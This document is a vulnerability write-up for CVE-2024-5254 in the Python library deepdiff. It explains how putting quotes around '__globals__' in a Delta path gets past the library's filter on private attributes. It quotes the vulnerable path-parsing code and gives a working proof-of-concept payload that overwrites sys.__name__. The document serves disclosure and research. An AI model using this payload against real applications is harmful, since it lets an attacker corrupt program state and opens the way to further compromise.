## deepdiff

### Meta

+ Library: deepdiff
+ Stars: 2K
+ Version: v8.0.0
+ CVE: CVE-2024-5254
+ Status: Accepted
+ Payload: ```{"attribute_added" : {"root['x']": namedtuple, "root['x'].'__globals__'['_sys'].'__name__'": "polluted"}}```
+ Foundby: chilaxan
+ Report: https://huntr.com/bounties/486add92-275e-4a7b-92f9-42d84bc759da
+ Type: Lib
+ Exploitability: High

### Library

https://github.com/seperman/deepdiff?tab=readme-ov-file

### Vulnerable Code Snippet

The `deepdiff` library allows you to apply diff changes to an object. It performs these changes by specifying a path (representing the key's location) and a value. Although the library includes a basic filter to block attribute keys starting with `__`, this safeguard can be bypassed by enclosing the key in single quotes `'`.

Here is the example of how path is used in the deepdiff.

```
Given a path, it extracts the elements that form the path and their relevant most likely retrieval action.

>>> from deepdiff import _path_to_elements
>>> path = "root[4.3].b['a3']"
>>> _path_to_elements(path, root_element=None)
[(4.3, 'GET'), ('b', 'GETATTR'), ('a3', 'GET')]
```

When the library parses a path into a sequence of actions, it uses the `_add_to_elements` function to process the key elements.
However, this function contains a vulnerability. If an element, such as `elem='__globals__'`, is wrapped in quotes, it bypasses the initial if check. The quotes are subsequently removed, allowing the special attribute key to be added to the elements list.

```
https://github.com/seperman/deepdiff/blob/6d8a4c7c32d5ac57919955954790be994d01fe57/deepdiff/path.py#L19-L36
def _add_to_elements(elements, elem, inside):
    # Ignore private items
    if not elem:
        return
    if not elem.startswith('__'):
        remove_quotes = False
        if '𝆺𝅥𝅯' in elem or '\\' in elem:
            remove_quotes = True
        else:
            try:
                elem = literal_eval(elem)
                remove_quotes = False
            except (ValueError, SyntaxError):
                remove_quotes = True
        if remove_quotes and elem[0] == elem[-1] and elem[0] in {'"', "'"}:
            elem = elem[1: -1]
        action = GETATTR if inside == '.' else GET
        elements.append((elem, action))
```

Finally, the deepdiff will 1/ first retrieve the nested object based on the parsed elements and 2/ set the value to the retrieved object.

```
def _get_nested_obj(obj, elements, next_element=None):
    for (elem, action) in elements:
        if action == GET:
            obj = obj[elem]
        elif action == GETATTR:
            obj = getattr(obj, elem)
    return obj

def _simple_set_elem_value(self, obj, path_for_err_reporting, elem=None, value=None, action=None):
    """
    Set the element value directly on an object
    """
    try:
        if action == GET:
            try:
                obj[elem] = value
            except IndexError:
                if elem == len(obj):
                    obj.append(value)
                else:
                    self._raise_or_log(ELEM_NOT_FOUND_TO_ADD_MSG.format(elem, path_for_err_reporting))
        elif action == GETATTR:
            setattr(obj, elem, value)
        else:
            raise DeltaError(INVALID_ACTION_WHEN_CALLING_SIMPLE_SET_ELEM.format(action))
    except (KeyError, IndexError, AttributeError, TypeError) as e:
        self._raise_or_log('Failed to set {} due to {}'.format(path_for_err_reporting, e))
```

### PoC

```
from deepdiff import Delta
from collections import namedtuple
import sys

# Payload
payload = {
  "attribute_added" : {
    "root['function']": namedtuple,
    "root['function'].'__globals__'['_sys'].'__name__'": "polluted",
  }
}

# Before the pollution check
print(f"Before the pollution: sys.__name__ = {getattr(sys, "__name__")}")

# Pollution
delta = Delta(payload)
obj1 = {"a": 1, "b": 2, "c": 3}
obj1 = obj1 + delta

# After the pollution check
print(f"After the pollution: sys.__name__ = {getattr(sys, "__name__")}")
```